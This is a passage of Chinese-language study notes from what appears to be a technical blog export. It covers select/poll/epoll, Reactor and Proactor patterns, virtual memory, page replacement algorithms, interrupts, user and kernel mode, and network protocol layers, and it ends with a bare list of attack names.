<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select</span><span class="params">( <span class="type">int</span> nfds， fd_set* readfds，fd_set* writefds，fd_set*exceptfds，</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">struct</span> timeval*timeout）；</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>ndfs：被监听的文件描述符的总数</p>
</li>
<li class="lvl-2">
<p>readfds、writefds、exceptfds：分别指向可读、可写和异常等事件对应的文件描述符集合。select调用返回时，内核将修改它们来通知应用程序哪些文件描述符已经就绪。</p>
</li>
<li class="lvl-2">
<p>timeout：设置select函数的超时事件</p>
</li>
</ul>
<h1>5 poll</h1>
<blockquote>
<p>和select类似，在指定时间内轮询一定数量的文件描述符，以测试是否有就绪的文件描述符</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">poll</span><span class="params">(<span class="keyword">struct</span> pollfd* fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pollfd</span>&#123;</span><br><span class="line">	<span class="type">int</span> fd;   <span class="comment">//文件描述符</span></span><br><span class="line">	<span class="type">short</span> events;  <span class="comment">//注册的事件</span></span><br><span class="line">	<span class="type">short</span> revents;  <span class="comment">//实际发生的事件，由内核填充</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>fds：pollfd结构类型的数组，指定所有我们感兴趣的文件描述符上发生的可读、可写和异常等事件</p>
</li>
<li class="lvl-2">
<p>nfds：被监听事件集合fds的大小</p>
</li>
<li class="lvl-2">
<p>timeout：指定poll的超时值，单位是毫秒。当timeout为-1时，poll调用将永远阻塞，直到某个事件发生；当timeout为0时，poll调用将立即返回</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311202143270.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311202143284.png" alt="image.png"></p>
<h1>6 epoll</h1>
<blockquote>
<p>把用户关心的文件描述符上的事件放在内核里的一个事件表中，而无须像select和poll那样每次调用都要重复传入文件描述符或事件集。<br>
epoll使用一个额外的文件描述符，来唯一标识内核中的这个事件表</p>
</blockquote>
<h3 id="6-1-1-epoll-create">6.1.1 epoll_create</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_create</span><span class="params">(<span class="type">int</span> size)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>返回文件描述符，作为其它epoll系统调用的第一个参数，以指定要访问的内核事件表</p>
</li>
</ul>
<h3 id="6-1-2-epoll-ctl">6.1.2 epoll_ctl</h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd,<span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">struct</span> epoll_event</span>&#123;</span><br><span class="line">	<span class="type">__uint32_t</span> events;    <span class="comment">//epoll事件</span></span><br><span class="line">	<span class="type">epoll_data_t</span> data;   <span class="comment">//用户数据</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> <span class="title class_">epoll_data</span>&#123;</span><br><span class="line">	<span class="type">void</span>* ptr；</span><br><span class="line">	<span class="type">int</span> fd； <span class="comment">//事件所从属的目标文件描述符</span></span><br><span class="line">	<span class="type">uint32_t</span> u32；</span><br><span class="line">	<span class="type">uint64_t</span> u64；</span><br><span class="line">&#125; <span class="type">epoll_data_t</span>;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>fd：要操作的文件描述符</p>
</li>
<li class="lvl-2">
<p>op：操作类型，<code>EPOLL_CTL_ADD</code>、<code>EPOLL_CTL_MOD</code> 、<code>EPOLL_CTL_DEL</code></p>
</li>
<li class="lvl-2">
<p>成功时返回0，失败则返回-1并设置errno</p>
</li>
</ul>
<h3 id="6-1-3-epoll-wait">6.1.3 epoll_wait</h3>
<blockquote>
<p>在一段超时时间内等待一组文件描述符上的事件</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="type">int</span> epfd， <span class="keyword">struct</span> epoll_event* events，<span class="type">int</span> maxevents, <span class="type">int</span> timeout ）；</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>maxevents参数指定最多监听多少个事件，它必须大于0。</p>
</li>
<li class="lvl-2">
<p>成功时返回就绪的文件描述符的个数，失败时返回-1并设置errno</p>
</li>
</ul>
<h3 id="6-1-4-LT和ET模式">6.1.4 LT和ET模式</h3>
<blockquote>
<p>epoll<mark>对文件描述符的操作</mark>有两种模式：LT（LevelTrigger，电平触发）模式和ET（Edge Trigger，边沿触发）模式。LT模式是默认的工作模式，这种模式下epoll相当于一个效率较高的poll。当往epoll内核事件表中注册一个文件描述符上的EPOLLET事件时，epoll将以ET模式来操作该文件描述符。ET模式是epoll的高效工作模式。</p>
</blockquote>
<h4 id="LT">LT</h4>
<p>对于采用LT工作模式的文件描述符，当epoll_wait检测到其上有事件发生并将此事件通知应用程序后，应用程序可以不立即处理该事件。这样，当应用程序下一次调用epoll_wait时，epoll_wait还会再次向应用程序通告此事件，直到该事件被处理。</p>
<h4 id="ET">ET</h4>
<p>而对于采用ET工作模式的文件描述符，当epoll_wait检测到其上有事件发生并将此事件通知应用程序后，应用程序必须立即处理该事件，因为后续的epoll_wait调用将不再向应用程序通知这一事件。<strong>边缘触发模式一般和非阻塞 I/O 搭配使用</strong>，以避免没有数据可读写时，进程会阻塞在读写函数那里</p>
<p>可见，ET模式在很大程度上降低了同一个epoll事件被重复触发的次数，因此效率要比LT模式高。</p>
<h3 id="6-1-5-EPOLLONESHOT">6.1.5 EPOLLONESHOT</h3>
<p>对于注册了EPOLLONESHOT事件的文件描述符，操作系统最多触发其上注册的一个可读、可写或者异常事件，且只触发一次，除非我们使用epollctl函数重置该文件描述符上注册的EPOLLONESHOT事件。这样，当一个线程在处理某个socket时，其他线程是不可能有机会操作该socket的。但反过来思考，注册了EPOLLONESHOT事件的socket一旦被某个线程处理完毕，该线程就应该立即重置这个socket上的EPOLLONESHO事件，以确保这个socket下一次可读时，其EPOLLIN事件能被触发，进而让其他工作线程有机会继续处理这个socket。</p>
<h1>7 select、poll和epoll的区别</h1>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311202326818.png" alt="image.png"></p>
<h1>8 Reactor和Proactor</h1>
<h1>9 事件处理模式</h1>
<blockquote>
<p>服务器程序需要处理三类事件：I/O事件、信号及定时事件。同步I/O模型通常用于实现Reactor模式异步I/O模型用于实现Proactor模式使用同步I/O方式模拟出Proactor模式</p>
</blockquote>
<p><code>在IO模型中，“同步”和“异步”区分的是内核向应用程序通知的是何种IO事件（是就绪事件还是完成事件），以及该由谁来完成IO读写（是应用程序还是内核）。</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>同步IO：应用程序完成读写</p>
</li>
<li class="lvl-2">
<p>异步IO：内核完成读写</p>
</li>
</ul>
<h2 id="9-1-模拟Proactor模式">9.1 模拟Proactor模式</h2>
<blockquote>
<p>主线程执行数据读写操作，读写完成之后，主线程向工作线程通知这一“完成事件”。那么从工作线程的角度来看，它们就直接获得了数据读写的结果，接下来要做的只是对读写的结果进行逻辑处理。（主线程代替内核完成数据读写）</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311172018370.png" alt="image.png"></p>
<h1>10 并发模式</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>半同步/半异步模式(half-sync/half-async)</p>
</li>
<li class="lvl-2">
<p>领导者/追随者模式(Leader/Followers)</p>
</li>
</ul>
<blockquote>
<p>在并发模式中，“同步”指的是程序完全按照代码序列的顺序执行；“异步”指的是程序的执行需要由系统事件来驱动。常见的系统事件包括中断、信号等。</p>
</blockquote>
<h2 id="10-1-半同步-半反应堆模式">10.1 半同步/半反应堆模式</h2>
<blockquote>
<p>半同步/半反应堆模式(half-sync/half-reactive)<br>
Reactor模式：工作线程自己从socket上读取客户请求和往socket写入服务器应答模拟Proactor模式：主线程完成数据的读写。这种情况下，主线程一般会将应用程序数据、任务类型等信息封装为一个任务对象，然后将其（或者指向该任务对象的一个指针）插入请求队列。工作线程从请求队列中取得任务对象之后，即可直接处理之，而无须执行读写操作了。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311161033365.png" alt="image.png"></p>
<h2 id="10-2-半同步-半异步模式">10.2 半同步/半异步模式</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311161033032.png" alt="image.png"></p>
<h1>11 一致性哈希</h1>
<p>应用场景是针对于有状态服务新增或下线节点<br>
<a href="https://xiaolincoding.com/os/8_network_system/hash.html#%E5%A6%82%E4%BD%95%E5%88%86%E9%85%8D%E8%AF%B7%E6%B1%82">9.4 什么是一致性哈希？ | 小林coding (xiaolincoding.com)</a></p>
<h1>12 参考</h1>
<p><a href="https://zhuanlan.zhihu.com/p/400798093">彻底弄懂IO复用：深入了解select，poll，epoll - 知乎 (zhihu.com)</a><br>
<a href="https://xiaolincoding.com/os/8_network_system/selete_poll_epoll.html#%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84-socket-%E6%A8%A1%E5%9E%8B">9.2 I/O 多路复用：select/poll/epoll | 小林coding (xiaolincoding.com)</a><br>
<a href="https://xiaolincoding.com/os/8_network_system/reactor.html#%E6%BC%94%E8%BF%9B">9.3 高性能网络模式：Reactor 和 Proactor | 小林coding (xiaolincoding.com)</a></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2023/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(2)%EF%BC%9A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>进程管理、内存管理、文件管理、设备管理</p>
<ul class="lvl-0">
<li class="lvl-2">设备管理：完成设备（输入输出设备和外部存储设备等）的请求或释放，以及设备启动等功能。</li>
<li class="lvl-2">文件管理：完成文件的读、写、创建及删除等功能。</li>
<li class="lvl-2">进程管理：进程的创建、撤销、阻塞、唤醒，进程间的通信等功能。</li>
<li class="lvl-2">内存管理：完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<h1>1 虚拟内存</h1>
<blockquote>
<p>程序需要被载入内存才能被调度和执行，在没有虚拟内存时，物理内存便是程序的地址空间，程序的地址空间受限于物理内存的大小。有了虚拟内存，通过对虚拟内存和物理内存进行划分，将程序运行所需要的部分载入物理内存中，建立虚拟内存和物理内存之间的映射，程序不必全部载入</p>
</blockquote>
<blockquote>
<p><strong>虚拟内存(Virtual Memory)</strong>：作为进程访问主存（物理内存）的桥梁并简化内存管理</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>隔离进程</strong>：物理内存通过虚拟地址空间访问，虚拟地址空间与进程一一对应。每个进程都认为自己拥有了整个物理内存，进程之间彼此隔离，一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。</p>
</li>
<li class="lvl-2">
<p><strong>提升物理内存利用率</strong>：有了虚拟地址空间后，操作系统只需要将进程当前正在使用的部分数据或指令加载入物理内存。</p>
</li>
<li class="lvl-2">
<p><strong>简化内存管理</strong>：进程都有一个一致且私有的虚拟地址空间，程序员不用和真正的物理内存打交道，而是借助虚拟地址空间访问物理内存，从而简化了内存管理。</p>
</li>
<li class="lvl-2">
<p><strong>多个进程共享物理内存</strong>：进程在运行过程中，会加载许多操作系统的动态库。这些库对于每个进程而言都是公用的，它们在内存中实际只会加载一份，这部分称为<mark>共享内存</mark>。</p>
</li>
<li class="lvl-2">
<p><strong>提高内存使用安全性</strong>：控制进程对物理内存的访问，隔离不同进程的访问权限，提高系统的安全性。</p>
</li>
<li class="lvl-2">
<p><strong>提供更大的可使用内存空间</strong>：可以让程序拥有超过系统物理内存大小的可用内存空间。这是因为当物理内存不够用时，可以利用磁盘充当，将物理内存页（通常大小为 4 KB）保存到磁盘文件（会影响读写速度），数据或代码页会根据需要在物理内存与磁盘之间移动。</p>
</li>
</ul>
<blockquote>
<p>[! note]<br>
受限于物理内存的大小，程序可能一次性无法完全载入内存，因此有了虚拟内存的概念。程序有自己的逻辑地址空间，并映射到物理内存。程序可以不必全部载入内存，而只载入需要的部分。</p>
<p>虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。</p>
<p>为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。</p>
<p>这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。</p>
</blockquote>
<p>虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。</p>
<blockquote>
<p>[!note] 虚拟内存、常驻内存和共享内存</p>
<ul class="lvl-1">
<li class="lvl-2"><strong>虚拟内存</strong>：指系统用分段，分页的方法把物理内存划分，映射给进程看到的连续的虚拟地址空间。好处允许多程序隔离，内存可以超过物理上限。可能有性能开销，页面抖动。</li>
<li class="lvl-2"><strong>共享内存</strong>：多个进程共享一片物理内存，允许同时访问，可以用来进程间通信和共享数据。</li>
<li class="lvl-2"><strong>常驻内存</strong>：未被交换给磁盘的常用部分页</li>
</ul>
</blockquote>
<p>页表是存储在内存里的，<strong>内存管理单元</strong> （<em>MMU</em>）就做将虚拟内存地址转换成物理地址的工作。</p>
<h1>2 页表、段表</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>把虚拟内存地址，切分成页号和偏移量；</p>
</li>
<li class="lvl-2">
<p>根据页号，从页表里面，查询对应的物理页号；</p>
</li>
<li class="lvl-2">
<p>直接拿物理页号，加上前面的偏移量，就得到了物理内存地址。</p>
</li>
</ul>
<p>通过段表找到段基地址，与段界限判断，加上偏移量</p>
<h1>3 页面置换算法</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>最佳页面置换算法（OPT，Optimal）</strong>：优先选择淘汰的页面是以后永不使用的，或者是在最长时间内不再被访问的页面，这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若干页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现，只是理论最优的页面置换算法，可以作为衡量其他置换算法优劣的标准。</p>
</li>
<li class="lvl-2">
<p><strong>先进先出页面置换算法（FIFO，First In First Out）</strong> : 最简单的一种页面置换算法，总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面进行淘汰。该算法易于实现和理解，一般只需要通过一个 FIFO 队列即可需求。不过，它的性能并不是很好。</p>
</li>
<li class="lvl-2">
<p><strong>最近最久未使用页面置换算法（LRU ，Least Recently Used）</strong>：LRU 算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 T，当须淘汰一个页面时，选择现有页面中其 T 值最大的，即最近最久未使用的页面予以淘汰。LRU 算法是根据各页之前的访问情况来实现，因此是易于实现的。OPT 算法是根据各页未来的访问情况来实现，因此是不可实现的。</p>
</li>
<li class="lvl-2">
<p><strong>最少使用页面置换算法（LFU，Least Frequently Used）</strong> : 和 LRU 算法比较像，不过该置换算法选择的是之前一段时间内使用最少的页面作为淘汰页。</p>
</li>
<li class="lvl-2">
<p><strong>时钟页面置换算法（Clock）</strong>：可以认为是一种最近未使用算法，即逐出的页面都是最近没有使用的那个。</p>
</li>
</ul>
<h1>4 内存分区，进程内存映象，linux内存模型</h1>
<ol>
<li class="lvl-3">
<p><strong>内存分区（Memory Partitioning）</strong>： 内存分区是指将计算机的物理内存划分成不同的区域，每个区域用于存储不同类型的数据。常见的内存分区包括：</p>
<ul class="lvl-2">
<li class="lvl-6">
<p><strong>代码段（Code Segment）</strong>：存储程序的执行代码。</p>
</li>
<li class="lvl-6">
<p><strong>数据段（Data Segment）</strong>：存储全局变量等数据。</p>
</li>
<li class="lvl-6">
<p><strong>堆（Heap）</strong>：用于动态分配内存，由程序员进行手动管理。</p>
</li>
<li class="lvl-6">
<p><strong>栈（Stack）</strong>：用于存储函数调用的局部变量、函数参数等。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>进程内存映像（Process Memory Image）</strong>： 进程内存映像是指一个运行的进程在内存中的布局和组织。它包括以下部分：</p>
<ul class="lvl-2">
<li class="lvl-6">
<p><strong>代码段</strong>：存储进程的执行代码。</p>
</li>
<li class="lvl-6">
<p><strong>数据段</strong>：包括初始化的全局变量和静态变量。</p>
</li>
<li class="lvl-6">
<p><strong>堆</strong>：用于动态分配内存，比如通过<code>malloc</code>和<code>free</code>。</p>
</li>
<li class="lvl-6">
<p><strong>栈</strong>：存储函数调用的局部变量、函数参数等。</p>
</li>
</ul>
<p>进程内存映像使得操作系统能够有效地管理多个进程，并确保它们之间不会相互干扰。</p>
</li>
<li class="lvl-3">
<p><strong>Linux内存模型</strong>： Linux操作系统采用了分页机制来管理内存，其中有两个关键概念：</p>
<ul class="lvl-2">
<li class="lvl-6">
<p><strong>虚拟内存（Virtual Memory）</strong>：允许程序使用比实际物理内存更大的地址空间。这使得每个进程都有独立的地址空间，提高了系统的稳定性和安全性。</p>
</li>
<li class="lvl-6">
<p><strong>分页（Paging）</strong>：将物理内存划分成大小固定的页面，与虚拟内存中的页面相对应。当一个程序需要访问某个页面时，操作系统将其加载到物理内存中。这有助于提高内存的利用率和管理效率。</p>
</li>
</ul>
</li>
</ol>
<h1>5 中断的基本框架，以键盘中断为例</h1>
<p>中断是计算机系统中一种异步事件处理的机制，允许系统在执行当前任务的同时响应外部事件。以下是处理中断的基本框架，以键盘中断为例：</p>
<ol>
<li class="lvl-3">
<p><strong>中断发生</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户按下键盘上的某个键触发中断，键盘控制器产生中断请求（IRQ）。</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>硬件层处理</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>CPU检测到中断请求，停止当前执行的任务。</p>
</li>
<li class="lvl-2">
<p>CPU保存当前执行任务的上下文（程序计数器、寄存器等）。</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p><strong>中断向量表</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>硬件通过中断向量表确定中断的类型和处理程序的入口地址。</p>
</li>
<li class="lvl-2">
<p>在键盘中断的情况下，中断向量表会指向处理键盘中断的中断服务程序。</p>
</li>
</ul>
<ol start="4">
<li class="lvl-3">
<p><strong>中断服务程序（Interrupt Service Routine，ISR）</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>控制权转移到相应中断的处理程序。</p>
</li>
<li class="lvl-2">
<p>在键盘中断的情况下，键盘中断服务程序负责处理键盘输入。</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p><strong>软件层处理</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>中断服务程序执行完毕后，CPU从中断返回指令（iret）返回到之前被中断的任务。</p>
</li>
<li class="lvl-2">
<p>恢复之前保存的任务上下文。</p>
</li>
</ul>
<ol start="6">
<li class="lvl-3">
<p><strong>继续执行任务</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>控制权返回到之前被中断的任务，任务继续执行。</p>
</li>
</ul>
<p>在这个基本框架下，中断服务程序是中断处理的核心。键盘中断服务程序将负责读取键盘输入、更新相应的数据结构、触发事件等。整个中断处理流程实现了异步事件的响应，使得系统能够在执行任务的同时处理来自外部的事件，提高了系统的响应性。</p>
]]></content>
      <tags>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/05/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9A%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>进程管理、内存管理、文件管理、设备管理</p>
<ul class="lvl-0">
<li class="lvl-2">设备管理：完成设备（输入输出设备和外部存储设备等）的请求或释放，以及设备启动等功能。</li>
<li class="lvl-2">文件管理：完成文件的读、写、创建及删除等功能。</li>
<li class="lvl-2">进程管理：进程的创建、撤销、阻塞、唤醒，进程间的通信等功能。</li>
<li class="lvl-2">内存管理：完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。</li>
</ul>
<h1>1 用户态和内核态</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>用户态(User Mode)</strong> : 用户态运行的进程可以直接读取用户程序的数据，拥有较低的权限。当应用程序需要执行某些需要特殊权限的操作，例如读写磁盘、网络通信等，就需要向操作系统发起系统调用请求，进入内核态。</p>
</li>
<li class="lvl-2">
<p><strong>内核态(Kernel Mode)</strong>：内核态运行的进程几乎可以访问计算机的任何资源包括系统的内存空间、设备、驱动程序等，不受限制，拥有非常高的权限。当操作系统接收到进程的系统调用请求时，就会从用户态切换到内核态，执行相应的系统调用，并将结果返回给进程，最后再从内核态切换回用户态。</p>
</li>
</ul>
<p>内核态相比用户态拥有更高的特权级别，因此能够执行更底层、更敏感的操作。不过，由于进入内核态需要付出较高的开销（需要进行一系列的上下文切换和权限检查），应该尽量减少进入内核态的次数，以提高系统的性能和稳定性。</p>
<p>内核态和用户态是操作系统中的两种运行模式。它们的主要区别在于权限和可执行的操作：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>内核态（Kernel Mode）：在内核态下，CPU可以执行所有的指令和访问所有的硬件资源。这种模式下的操作具有更高的权限，主要用于操作系统内核的运行。</p>
</li>
<li class="lvl-2">
<p>用户态（User Mode）：在用户态下，CPU只能执行部分指令集，无法直接访问硬件资源。这种模式下的操作权限较低，主要用于运行用户程序。<br>
内核态的底层操作主要包括：内存管理、进程管理、设备驱动程序控制、系统调用等。这些操作涉及到操作系统的核心功能，需要较高的权限来执行。</p>
</li>
</ul>
<p>分为内核态和用户态的原因主要有以下几点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>安全性：通过对权限的划分，用户程序无法直接访问硬件资源，从而避免了恶意程序对系统资源的破坏。</p>
</li>
<li class="lvl-2">
<p>稳定性：用户态程序出现问题时，不会影响到整个系统，避免了程序故障导致系统崩溃的风险。</p>
</li>
<li class="lvl-2">
<p>隔离性：内核态和用户态的划分使得操作系统内核与用户程序之间有了明确的边界，有利于系统的模块化和维护。内核态和用户态的划分有助于保证操作系统的安全性、稳定性和易维护性。</p>
</li>
</ul>
<h2 id="1-1-用户态和内核态切换">1.1 用户态和内核态切换</h2>
<p>切换方式：系统调用（Trap）、中断（Interrupt）、异常（Exception）</p>
<ol>
<li class="lvl-3">
<p><strong>系统调用（Trap）</strong>：用户态进程 <strong>主动</strong> 要求切换到内核态的一种方式，主要是为了使用内核态才能做的事情比如读取磁盘资源。系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现。</p>
</li>
<li class="lvl-3">
<p><strong>中断（Interrupt）</strong>：当外围设备完成用户请求的操作后，会向 CPU 发出相应的中断信号，这时 CPU 会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p>
</li>
<li class="lvl-3">
<p><strong>异常（Exception）</strong>：当 CPU 在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p>
</li>
</ol>
<p>在系统的处理上，中断和异常类似，都是通过中断向量表来找到相应的处理程序进行处理。区别在于，中断来自处理器外部，不是由任何一条专门的指令造成，而异常是执行当前指令的结果。</p>
<h2 id="1-2-堆、栈">1.2 堆、栈</h2>
<p>堆：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>动态内存分配</p>
</li>
<li class="lvl-2">
<p>向高地址方向增长栈：</p>
</li>
<li class="lvl-2">
<p>向低地址方向增长</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/afghjhg/article/details/140121056#:~:text=%E5%A0%86%E5%92%8C%E6%A0%88%E6%98%AF%E4%B8%A4%E7%A7%8D%E4%B8%8D%E5%90%8C">【数据结构/操作系统 堆和栈】区别及应用场景、底层原理图解_堆和栈的操作系统底层实现-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title>计算机网络(1)：基础</title>
    <url>/2024/05/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C(1)%EF%BC%9A%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1>1 协议栈</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403142031069.png" alt=""></p>
<h1>2 协议分层</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403152221265.png" alt="image.png|450"></p>
<p>应用层，负责给应用程序提供统一的接口；表示层，负责把数据转换成兼容另一个系统能识别的格式；会话层，负责建立、管理和终止表示层实体之间的通信会话；传输层，负责端到端的数据传输；网络层，负责数据的路由、转发、分片；数据链路层，负责数据的封帧和差错检测，以及 MAC 寻址；物理层，负责在物理网络中传输数据帧</p>
<h1>3 TCP/IP四层模型</h1>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403142030648.PNG" alt="20210717222451.PNG" style="zoom:50%;" />
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404242211249.png" alt="image.png|525"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>MTU</code>：一个网络包的最大长度，以太网中一般为 <code>1500</code> 字节。</p>
</li>
<li class="lvl-2">
<p><code>MSS</code>：除去 IP 和 TCP 头部之后，一个网络包所能容纳的 TCP 数据的最大长度。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409072218165.png" alt="image.png"></p>
</li>
</ul>
<p>应用层：<strong>应用层位于传输层之上，主要提供两个终端设备上的应用程序之间信息交换的服务，它定义了信息交换的格式，消息会交给下一层传输层来传输。</strong><br>
传输层：<strong>传输层的主要任务就是负责向两台终端设备进程之间的通信提供通用的数据传输服务。</strong><br>
网络层：<strong>网络层负责为分组交换网上的不同主机提供通信服务。</strong></p>
<blockquote>
<p>[!question] 访问网页过程</p>
<ol>
<li class="lvl-3">在浏览器中输入指定网页的 URL，解析URL地址，确定Web服务器和请求的文件名</li>
<li class="lvl-3">浏览器通过 <mark>DNS 协议</mark>，获取域名对应的 IP 地址。（DNS查找过程：浏览器缓存、路由器缓存、DNS缓存）</li>
<li class="lvl-3">浏览器根据 IP 地址和端口号，向目标服务器发起一个 <mark>TCP 连接</mark>请求。</li>
<li class="lvl-3">浏览器在 TCP 连接上，向服务器发送一个 HTTP 请求报文，请求获取网页的内容。</li>
<li class="lvl-3">服务器收到 HTTP 请求报文后，处理请求，并返回 HTTP 响应报文给浏览器。</li>
<li class="lvl-3">浏览器收到 HTTP 响应报文后，解析响应体中的 HTML 代码，渲染网页的结构和样式，同时根据 HTML 中的其他资源的 URL（如图片、CSS、JS 等），再次发起 HTTP 请求，获取这些资源的内容，直到网页完全加载显示。</li>
<li class="lvl-3">浏览器在不需要和服务器通信时，可以主动关闭 TCP 连接，或者等待服务器的关闭请求。</li>
</ol>
</blockquote>
<blockquote>
<p>直接在浏览器输入IP地址：访问不到</p>
</blockquote>
<h1>4 网络攻击</h1>
<h2 id="4-1-DDos">4.1 DDos</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>SYN泛洪攻击</p>
</li>
<li class="lvl-2">
<p>TCP劫持攻击</p>
</li>
<li class="lvl-2">
<p>中间人攻击</p>
</li>
</ul>
